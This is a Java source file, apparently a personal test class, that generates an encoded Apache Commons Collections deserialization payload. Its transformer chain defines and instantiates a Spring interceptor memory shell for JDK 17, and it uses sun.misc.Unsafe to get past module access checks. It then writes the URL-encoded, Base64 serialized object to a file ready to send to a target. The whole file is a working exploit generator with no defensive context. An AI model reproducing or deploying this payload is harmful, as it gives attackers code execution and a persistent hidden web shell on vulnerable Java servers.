package com.example.demo.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static java.nio.file.Files.readAllBytes;

public class Test01
{
    public static void main(String[] args) throws Exception{
        patchModule(Test01.class);
        String shellinject="D:\\1tmp\\memshell\\Sping_Interceptor\\BadInterceptor_within_jdk17.class";
        byte[] data = Files.readAllBytes(Paths.get(shellinject));


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(MethodHandles.class),
                new InvokerTransformer("getDeclaredMethod", new
                        Class[]{String.class, Class[].class}, new Object[]{"lookup", new
                        Class[0]}),
                new InvokerTransformer("invoke", new Class[]
                        {Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]
                        {byte[].class}, new Object[]{data}),
                new InstantiateTransformer(new Class[0], new
                        Object[0]),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new
                Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.remove("keykey");

        setFieldValue(transformerChain,"iTransformers",transformers);
        String encode = URLEncoder.encode(Base64.getEncoder().encodeToString(serialize(expMap)));
        new FileOutputStream("D://1tmp//payload.txt").write(encode.getBytes());
    }

    private static void patchModule(Class classname){
        try {
            Class UnsafeClass=Class.forName("sun.misc.Unsafe");
            Field unsafeField=UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe=(Unsafe) unsafeField.get(null);
            Module ObjectModule=Object.class.getModule();

            Class currentClass=classname.getClass();
            long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static byte[] serialize(Object object) {
        try {
            ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(object);
            objectOutputStream.close();
            return byteArrayOutputStream.toByteArray();
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

}
